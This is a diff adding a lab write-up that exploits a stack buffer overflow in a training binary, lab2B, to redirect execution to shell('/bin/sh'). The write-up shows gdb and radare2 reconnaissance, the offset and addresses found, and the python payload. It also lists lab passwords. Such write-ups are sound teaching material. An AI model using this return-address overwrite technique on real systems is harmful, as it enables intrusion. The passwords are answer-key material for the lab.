@@ -308,6 +308,86 @@ $
 1m_all_ab0ut_d4t_b33f
 ```
 
+## Lab2B
+
+### Recon
+
+```C
+int main(int argc, char** argv)
+{
+        if(argc != 2)
+        {
+                printf("usage:\n%s string\n", argv[0]);
+                return EXIT_FAILURE;
+        }
+
+        print_name(argv[1]);
+
+        return EXIT_SUCCESS;
+}
+```
+Once agaain, there's an obvious overflow bug in argv[1]'s handling by ```main``` function. But this time ```shell()``` won't be called directly. This time we have to manipulate program's control flow, to get print_name's retuen value to be redirected to shell. It's an RIP overwrite.
+
+```
+gdb-peda$ pattern_arg 200
+[...]
+gdb-peda$ pattern_offsett $eip
+994132292 found at offset: 27
+```
+
+We would have to determine ```shell()```'s address in .text section by using radare i.e.:
+
+```
+r2 -A ./lab2B
+ -- Find hexpairs with '/x a0 cc 33'
+[0x080485c0]> afl~shell
+0x080486bd  19  1  sym.shell
+[0x080486bd]> !!rax2 -N 0x080486bd
+\xbd\x86\x04\x08
+```
+
+We write the identified pattern into temporary file:
+
+```
+$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08"') > /tmp/pattern.txt
+$ gdb --quiet -q ./lab2B
+$ gdb-peda$ gdb-peda$ r $(cat /tmp/pattern.txt)
+Starting program: /levels/lab02/lab2B $(cat /tmp/pattern.txt)
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAA
+[New process 1160]
+process 1160 is executing new program: /bin/dash
+```
+
+But new process exited with ```EXIT_FAILURE```... So something is missing.
+It's the argument for ```shell()``` function. Luckily the string "/bin/sh" is hard wired in binary's text section:
+
+```
+$ r2 -A ./lab2B
+ -- r2 is meant to be read by machines.
+[0x080485c0]> fs strings; f
+0x080487d0 8 str._bin_sh
+0x080487d8 10 str.Hello__s_n
+0x080487e2 18 str.usage:_n_s_string_n
+[0x080485c0]> !!rax2 -N 0x080487d0
+\xd0\x87\x04\x08
+```
+
+We also have to set some some return value after opening shell, but it's value doesn't really matter. After grabbing our flag forked process will die...Who cares?
+
+```
+$ echo $(python -c 'print "A"*27+"\xbd\x86\x04\x08" + "JUNK" + "\xd0\x87\x04\x08"') > /tmp/pattern.txt
+$ ./lab2B $(cat /tmp/pattern.txt)
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAJUNKЇ
+$
+
+```
+
+### Pass Lab2A
+
+```
+i_c4ll_wh4t_i_w4nt_n00b
+```
+
 ### Pass Lab3C
 ```
 th3r3_iz_n0_4dm1ns_0n1y_U!
